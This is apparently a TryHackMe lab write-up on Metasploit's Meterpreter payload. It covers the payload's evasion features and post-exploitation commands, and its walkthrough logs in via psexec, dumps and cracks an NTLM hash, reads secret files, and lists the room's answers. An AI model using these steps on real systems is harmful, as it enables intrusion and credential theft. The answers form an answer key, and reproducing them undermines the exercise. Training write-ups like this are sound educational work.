# Metasploit: Meterpreter - TryHackMe

> Take a deep dive into Meterpreter, and see how in-memory payloads can be used for post-exploitation

**Room Link:** https://tryhackme.com/room/meterpreter

<img width="1779" height="860" alt="image" src="https://github.com/user-attachments/assets/56327d4b-2672-46aa-a401-31b9d8c77013" />

---

## Task 1: Introduction to Meterpreter

### What is Meterpreter?

Meterpreter is a powerful Metasploit payload that supports penetration testing with many valuable features. It has different versions based on the target system.

### Key Features

**Runs in Memory (RAM)**
- Doesn't write files to disk (no Meterpreter.exe)
- Harder for antivirus to detect
- Appears as a process, not a file

**Encrypted Communications**
- Encrypts traffic with Metasploit server
- Helps avoid IPS/IDS detection
- Works like HTTPS traffic

**Stealth Mode**
- Runs under legitimate process names
- Example: Shows as `spoolsv.exe` instead of `meterpreter.exe`

### Checking Meterpreter Process

```bash
meterpreter > getpid
Current pid: 1304

meterpreter > ps
Process list:
PID   Name
1304  spoolsv.exe
```

Notice how the process appears as a legitimate Windows service!

**Note:** Modern antivirus tools can still detect Meterpreter, but it provides some stealth.

**No answer needed**

---

## Task 2: Meterpreter Flavors

### Payload Categories

**Inline (Singles)**
- Sent in a single step
- Self-contained

**Staged**
- Sent in two steps
- Stager installed first, then downloads the rest
- Smaller initial payload size

### List Available Payloads

```bash
msfvenom --list payloads | grep meterpreter
```

### Available Versions

Meterpreter supports multiple platforms:
- Android
- Apple iOS
- Java
- Linux
- OSX
- PHP
- Python
- Windows

### Choosing the Right Payload

Consider these 3 factors:

1. **Target OS** - Windows, Linux, Mac, etc.
2. **Available Components** - Is Python installed? PHP website?
3. **Network Connection** - TCP? HTTPS? IPv6?

**No answer needed**

---

## Task 3: Meterpreter Commands

### Viewing Available Commands

```bash
meterpreter > help
```

### Command Categories

Each Meterpreter version has different commands organized into categories:

- **Core** - Basic Meterpreter commands
- **File System** - File operations
- **Networking** - Network operations
- **System** - System information
- **User Interface** - UI manipulation
- **Webcam** - Camera access
- **Audio Output** - Audio control
- **Elevate** - Privilege escalation
- **Password Database** - Credential access
- **Timestomp** - Timestamp modification

**Note:** Some commands may not work depending on the target system.

**No answer needed**

---

## Task 4: Post-Exploitation with Meterpreter

### Essential Meterpreter Commands

**help** - Lists all available commands

**getuid** - Shows current user
```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**ps** - Lists running processes
```bash
meterpreter > ps
```

**migrate** - Move to another process
```bash
meterpreter > migrate 716
```

**Migration Tips:**
- Helps interact with specific processes
- Can capture keystrokes from word processors
- May lose privileges (SYSTEM → regular user)
- Makes session more stable

**hashdump** - Dumps password hashes
```bash
meterpreter > hashdump
Administrator:500:hash1:hash2:::
```

**Password Hashes:**
- Stored in NTLM format
- Can crack with online databases
- Useful for Pass-the-Hash attacks

**search** - Find files
```bash
meterpreter > search -f flag.txt
```

**shell** - Launch command prompt
```bash
meterpreter > shell
C:\Windows\system32>
```
Press CTRL+Z to return to Meterpreter.

**No answer needed**

---

## Task 5: Post-Exploitation Challenge

### Objective

Use Meterpreter to gather information from a compromised system.

### Initial Setup

**Start the exploit:**
```bash
msf6 > use exploit/windows/smb/psexec
msf6 exploit(psexec) > show options
```

**Set required options:**
```bash
set RHOSTS [target IP]
set SMBUser ballen
set SMBPass Password1
set LHOST [your IP]
exploit
```

Once successful, you'll get a Meterpreter session!

### Questions

**What is the computer name?**

Use the `sysinfo` command:
```bash
meterpreter > sysinfo
Computer        : ACME-TEST
```

- Answer: `ACME-TEST`

---

**What is the target domain?**

**Method 1:** Using sysinfo
```bash
meterpreter > sysinfo
Domain          : FLASH
```

**Method 2:** Using enum_domain module
```bash
meterpreter > background
msf6 > use post/windows/gather/enum_domain
msf6 post(enum_domain) > set SESSION 1
msf6 post(enum_domain) > run
```

- Answer: `FLASH`

---

**What is the name of the share likely created by the user?**

Get back to Meterpreter session:
```bash
msf6 > sessions -i 1
```

Use the enum_shares module:
```bash
meterpreter > background
msf6 > use post/windows/gather/enum_shares
msf6 post(enum_shares) > set SESSION 1
msf6 post(enum_shares) > run
```

Look for non-default shares created by users.

- Answer: `speedster`

---

**What is the NTLM hash of the jchambers user?**

Dump password hashes:
```bash
meterpreter > hashdump
jchambers:1000:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
```

**Hash format:** `username:RID:LM_hash:NTLM_hash:::`

The NTLM hash is the second long string between colons.

- Answer: `69596c7aa1e8daee17f8e78870e25a5c`

---

**What is the cleartext password of the jchambers user?**

Use an online NTLM cracker like [CrackStation](https://crackstation.net)

Paste the hash: `69596c7aa1e8daee17f8e78870e25a5c`

- Answer: `Trustno1`

---

**Where is the "secrets.txt" file located?**

Search for the file:
```bash
meterpreter > search -f secrets.txt
Found 1 result...
c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt
```

- Answer: `c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt`

---

**What is the Twitter password revealed in the "secrets.txt" file?**

Read the file contents:
```bash
meterpreter > cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
```

**Important:** Put the path in quotes!

- Answer: `KDSvbsw3849`

---

**Where is the "realsecret.txt" file located?**

Search for the file:
```bash
meterpreter > search -f realsecret.txt
Found 1 result...
c:\inetpub\wwwroot\realsecret.txt
```

- Answer: `c:\inetpub\wwwroot\realsecret.txt`

---

**What is the real secret?**

Read the file:
```bash
meterpreter > cat c:\\inetpub\\wwwroot\\realsecret.txt
The Flash is the fastest man alive
```

**Important:** Use double backslashes (`\\`) and NO quotes!

- Answer: `The Flash is the fastest man alive`

---

## Quick Reference

### Essential Meterpreter Commands

| Command | Purpose |
|---------|---------|
| `help` | List all commands |
| `sysinfo` | System information |
| `getuid` | Current user |
| `ps` | Running processes |
| `migrate [PID]` | Move to another process |
| `hashdump` | Dump password hashes |
| `search -f [file]` | Find files |
| `cat [file]` | Read file contents |
| `shell` | Launch command prompt |
| `background` | Background session |
| `sessions -i [ID]` | Return to session |

### Post-Exploitation Modules

| Module | Purpose |
|--------|---------|
| `post/windows/gather/enum_domain` | Get domain info |
| `post/windows/gather/enum_shares` | List SMB shares |
| `post/windows/gather/hashdump` | Extract hashes |

---

## Key Takeaways

- **Meterpreter runs in memory** - Harder to detect than disk-based malware
- **Different flavors** for different targets (Windows, Linux, Android, etc.)
- **Staged payloads** are smaller and more flexible
- **migrate** helps maintain stable sessions
- **hashdump** extracts password hashes from Windows
- **search** quickly finds important files
- **Background sessions** with CTRL+Z or `background`
- **File paths** require special formatting (quotes or double backslashes)
- **Post modules** provide additional reconnaissance capabilities
- Always check `sysinfo` to understand your target
